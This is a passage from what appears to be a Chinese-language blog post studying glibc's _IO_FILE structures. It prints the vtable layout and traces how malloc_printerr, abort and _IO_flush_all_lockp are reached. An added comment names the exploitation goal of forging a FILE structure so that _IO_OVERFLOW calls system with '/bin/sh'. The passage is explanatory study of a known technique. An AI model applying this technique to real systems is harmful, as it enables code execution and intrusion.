  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_ptr<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Current put pointer. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_end<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* End of put area. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_buf_base<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* Start of reserve area. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_buf_end<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* End of reserve area. */</span>
  <span class="token comment" spellcheck="true">/* The following fields are used to support backing up and undo. */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Pointer to start of non-current get area. */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Pointer to first valid character of backup area */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Pointer to end of non-current get area. */</span>

  <span class="token keyword">struct</span> _IO_marker <span class="token operator">*</span>_markers<span class="token punctuation">;</span>

  <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span>_chain<span class="token punctuation">;</span>

  <span class="token keyword">int</span> _fileno<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">if</span> 0</span>
  <span class="token keyword">int</span> _blksize<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">else</span></span>
  <span class="token keyword">int</span> _flags2<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
  _IO_off_t _old_offset<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* This used to be _offset but it's too small.  */</span>

<span class="token macro property">#<span class="token directive keyword">define</span> __HAVE_COLUMN </span><span class="token comment" spellcheck="true">/* temporary */</span>
  <span class="token comment" spellcheck="true">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> _cur_column<span class="token punctuation">;</span>
  <span class="token keyword">signed</span> <span class="token keyword">char</span> _vtable_offset<span class="token punctuation">;</span>
  <span class="token keyword">char</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment" spellcheck="true">/*  char* _save_gptr;  char* _save_egptr; */</span>

  _IO_lock_t <span class="token operator">*</span>_lock<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_MAGIC 0xFBAD0000 </span><span class="token comment" spellcheck="true">/* Magic number */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 </span><span class="token comment" spellcheck="true">/* Emulate old stdio. */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_USER_BUF 1 </span><span class="token comment" spellcheck="true">/* User owns buffer; don't delete it on close. */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_UNBUFFERED 2</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_NO_READS 4 </span><span class="token comment" spellcheck="true">/* Reading not allowed */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_NO_WRITES 8 </span><span class="token comment" spellcheck="true">/* Writing not allowd */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_EOF_SEEN 0x10</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_ERR_SEEN 0x20</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 </span><span class="token comment" spellcheck="true">/* Don't call close(_fileno) on cleanup. */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_LINKED 0x80 </span><span class="token comment" spellcheck="true">/* Set if linked (using _chain) to streambuf::_list_all.*/</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_IN_BACKUP 0x100</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_LINE_BUF 0x200</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_TIED_PUT_GET 0x400 </span><span class="token comment" spellcheck="true">/* Set if put and get pointer logicly tied. */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_IS_APPENDING 0x1000</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_IS_FILEBUF 0x2000</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_BAD_SEEN 0x4000</span>
<span class="token macro property">#<span class="token directive keyword">define</span> _IO_USER_LOCK 0x8000</span></code></pre>
<p>其中<code>_IO_2_1_stdin_</code>，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stderr_</code>定义如下</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">extern</span> <span class="token keyword">struct</span> _IO_FILE_plus _IO_2_1_stdin_<span class="token punctuation">;</span>
<span class="token keyword">extern</span> <span class="token keyword">struct</span> _IO_FILE_plus _IO_2_1_stdout_<span class="token punctuation">;</span>
<span class="token keyword">extern</span> <span class="token keyword">struct</span> _IO_FILE_plus _IO_2_1_stderr_<span class="token punctuation">;</span></code></pre>
<p><code>_IO_2_1_stdin_</code>，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stderr_</code>都是<code>_IO_FILE_plus</code>结构体指针，除了这三个以外，还有一个<code>_IO_list_all</code>也是<code>_IO_FILE_plus</code>结构体指针，用来管理所有的<code>_IO_FILE</code></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">extern</span> <span class="token keyword">struct</span> _IO_FILE_plus <span class="token operator">*</span>_IO_list_all<span class="token punctuation">;</span></code></pre>
<p>我们再看看<code>_IO_FILE_plus</code>结构体的定义</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> _IO_FILE_plus
<span class="token punctuation">{</span>
  _IO_FILE file<span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token keyword">struct</span> _IO_jump_t <span class="token operator">*</span>vtable<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
<p><code>_IO_FILE_plus</code>包含一个<code>_IO_FILE</code>结构体和一个_<code>IO_jump_t</code>结构体类型的指针，记作<code>vtable</code>，我们再看到<code>IO_jump_t</code>结构体定义</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> _IO_jump_t
<span class="token punctuation">{</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>size_t<span class="token punctuation">,</span> __dummy<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>size_t<span class="token punctuation">,</span> __dummy2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_finish_t<span class="token punctuation">,</span> __finish<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_overflow_t<span class="token punctuation">,</span> __overflow<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __underflow<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __uflow<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_pbackfail_t<span class="token punctuation">,</span> __pbackfail<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">/* showmany */</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsputn_t<span class="token punctuation">,</span> __xsputn<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsgetn_t<span class="token punctuation">,</span> __xsgetn<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekoff_t<span class="token punctuation">,</span> __seekoff<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekpos_t<span class="token punctuation">,</span> __seekpos<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_setbuf_t<span class="token punctuation">,</span> __setbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_sync_t<span class="token punctuation">,</span> __sync<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_doallocate_t<span class="token punctuation">,</span> __doallocate<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_read_t<span class="token punctuation">,</span> __read<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_write_t<span class="token punctuation">,</span> __write<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seek_t<span class="token punctuation">,</span> __seek<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_close_t<span class="token punctuation">,</span> __close<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_stat_t<span class="token punctuation">,</span> __stat<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_showmanyc_t<span class="token punctuation">,</span> __showmanyc<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_imbue_t<span class="token punctuation">,</span> __imbue<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">if</span> 0</span>
    get_column<span class="token punctuation">;</span>
    set_column<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
<p>于是整个<code>_IO_FILE_plus</code>结构体的示意图如下</p>
<p><img src="http://img2.tan90.me/IO_FILE_3df9ac2c8dabbdc5ca11a5d505598c2c.png" alt="IO_FILE"></p>
<p>而<code>_IO_2_1_stdin_</code>，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stderr_</code>和<code>_IO_list_all</code>都是通过<code>_IO_FILE</code>结构体中的<code>_chain</code>指针相连的，而<code>_chain</code>指针也是一个_IO_FILE结构体指针</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span>_chain<span class="token punctuation">;</span></code></pre>
<p>它们的连接顺序如下</p>
<p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/1.png" alt=""></p>
<p>glibc中有一个函数<code>_IO_flush_all_lockp</code>，该函数的功能是刷新所有FILE结构体的输出缓冲区</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span>
<span class="token function">_IO_flush_all_lockp</span> <span class="token punctuation">(</span><span class="token keyword">int</span> do_lock<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
  <span class="token keyword">int</span> last_stamp<span class="token punctuation">;</span>

<span class="token macro property">#<span class="token directive keyword">ifdef</span> _IO_MTSAFE_IO</span>
  <span class="token function">__libc_cleanup_region_start</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">,</span> flush_cleanup<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>
    <span class="token function">_IO_lock_lock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>

  last_stamp <span class="token operator">=</span> _IO_list_all_stamp<span class="token punctuation">;</span>
  fp <span class="token operator">=</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> _IO_list_all<span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span>fp <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      run_fp <span class="token operator">=</span> fp<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>
    <span class="token function">_IO_flockfile</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span>
<span class="token macro property">#<span class="token directive keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span>
       <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>
           <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_mode <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_ptr
                    <span class="token operator">></span> fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
       <span class="token punctuation">)</span>
      <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>
    <span class="token function">_IO_funlockfile</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
      run_fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span>last_stamp <span class="token operator">!=</span> _IO_list_all_stamp<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token comment" spellcheck="true">/* Something was added to the list.  Start all over again.  */</span>
      fp <span class="token operator">=</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> _IO_list_all<span class="token punctuation">;</span>
      last_stamp <span class="token operator">=</span> _IO_list_all_stamp<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
      <span class="token keyword">else</span>
    fp <span class="token operator">=</span> fp<span class="token operator">-></span>_chain<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token macro property">#<span class="token directive keyword">ifdef</span> _IO_MTSAFE_IO</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>
    <span class="token function">_IO_lock_unlock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__libc_cleanup_region_end</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>

  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>根据大佬的分析，以下三种操作会触发<code>_IO_flush_all_lockp</code></p>
<pre><code>libc执行abort函数时。
程序执行exit函数时。
程序从main函数返回时。</code></pre><p>我这里只分析第一种，<code>libc执行abort函数时</code>，我们知道，当malloc出错时会执行<code>malloc_printerr</code>函数，源码如下</p>
<pre class=" language-c"><code class="language-c"><span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token keyword">int</span> action<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> mstate ar_ptr<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token comment" spellcheck="true">/* Avoid using this arena in future.  We do not attempt to synchronize this
     with anything else because we minimally want to ensure that __libc_message
     gets its resources safely without stumbling on the current corruption.  */</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">)</span>
    <span class="token function">set_arena_corrupt</span> <span class="token punctuation">(</span>ar_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>action <span class="token operator">&amp;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span>
    <span class="token function">__libc_message</span> <span class="token punctuation">(</span>action <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"%s\n"</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>action <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

      buf<span class="token punctuation">[</span><span class="token keyword">sizeof</span> <span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
      <span class="token keyword">char</span> <span class="token operator">*</span>cp <span class="token operator">=</span> <span class="token function">_itoa_word</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span> ptr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token keyword">sizeof</span> <span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span>cp <span class="token operator">></span> buf<span class="token punctuation">)</span>
        <span class="token operator">*</span><span class="token operator">--</span>cp <span class="token operator">=</span> <span class="token string">'0'</span><span class="token punctuation">;</span>

      <span class="token function">__libc_message</span> <span class="token punctuation">(</span>action <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"*** Error in `%s': %s: 0x%s ***\n"</span><span class="token punctuation">,</span>
                      __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token punctuation">:</span> <span class="token string">"&lt;unknown>"</span><span class="token punctuation">,</span> str<span class="token punctuation">,</span> cp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>action <span class="token operator">&amp;</span> <span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token function">abort</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>可以看到<code>malloc_printerr</code>函数调用了<code>libc_message</code>函数，跟进<code>libc_message</code></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token keyword">int</span> do_abort<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>fmt<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  va_list ap<span class="token punctuation">;</span>
  <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>

  <span class="token function">va_start</span> <span class="token punctuation">(</span>ap<span class="token punctuation">,</span> fmt<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token macro property">#<span class="token directive keyword">ifdef</span> FATAL_PREPARE</span>
  FATAL_PREPARE<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  <span class="token function">va_end</span> <span class="token punctuation">(</span>ap<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>do_abort<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">BEFORE_ABORT</span> <span class="token punctuation">(</span>do_abort<span class="token punctuation">,</span> written<span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token comment" spellcheck="true">/* Kill the application.  */</span>
      <span class="token function">abort</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p><code>__libc_message</code>函数调用了<code>abort</code>函数，我们继续跟进<code>abort</code>函数</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">abort</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">struct</span> sigaction act<span class="token punctuation">;</span>
  sigset_t sigs<span class="token punctuation">;</span>

  <span class="token comment" spellcheck="true">/* First acquire the lock.  */</span>
  <span class="token function">__libc_lock_lock_recursive</span> <span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment" spellcheck="true">/* Now it's for sure we are alone.  But recursive calls are possible.  */</span>

  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

  <span class="token comment" spellcheck="true">/* Flush all streams.  We cannot close them now because the user
     might have registered a handler for SIGABRT.  */</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>stage <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token operator">++</span>stage<span class="token punctuation">;</span>
      <span class="token function">fflush</span> <span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token punctuation">}</span></code></pre>
<p>然后abort又调用了fflush函数</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> fflush(s) _IO_flush_all_lockp (0)</span></code></pre>
<p>而实际上<code>fflush</code>就是<code>_IO_flush_all_lockp</code>，继续跟进到<code>_IO_flush_all_lockp</code>函数中</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span>
<span class="token function">_IO_flush_all_lockp</span> <span class="token punctuation">(</span><span class="token keyword">int</span> do_lock<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
  <span class="token keyword">int</span> last_stamp<span class="token punctuation">;</span>

<span class="token macro property">#<span class="token directive keyword">ifdef</span> _IO_MTSAFE_IO</span>
  <span class="token function">__libc_cleanup_region_start</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">,</span> flush_cleanup<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>
    <span class="token function">_IO_lock_lock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>

  last_stamp <span class="token operator">=</span> _IO_list_all_stamp<span class="token punctuation">;</span>
  fp <span class="token operator">=</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> _IO_list_all<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将_IO_list_all赋给fp</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span>fp <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      run_fp <span class="token operator">=</span> fp<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>
    <span class="token function">_IO_flockfile</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span>
<span class="token macro property">#<span class="token directive keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span>
       <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>
           <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_mode <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_ptr
                    <span class="token operator">></span> fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
       <span class="token punctuation">)</span>
      <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//我们的目标，在伪造的FILE结构体中将_IO_OVERFLOW设置为system，fp开头的值，即_flag设置为/bin/sh</span>
          <span class="token comment" spellcheck="true">//要执行_IO_OVERFLOW，我们需要满足if判断的条件</span>
    result <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>
    <span class="token function">_IO_funlockfile</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
      run_fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span>last_stamp <span class="token operator">!=</span> _IO_list_all_stamp<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token comment" spellcheck="true">/* Something was added to the list.  Start all over again.  */</span>
      fp <span class="token operator">=</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> _IO_list_all<span class="token punctuation">;</span>
      last_stamp <span class="token operator">=</span> _IO_list_all_stamp<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
      <span class="token keyword">else</span>
    fp <span class="token operator">=</span> fp<span class="token operator">-></span>_chain<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token macro property">#<span class="token directive keyword">ifdef</span> _IO_MTSAFE_IO</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>
    <span class="token function">_IO_lock_unlock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
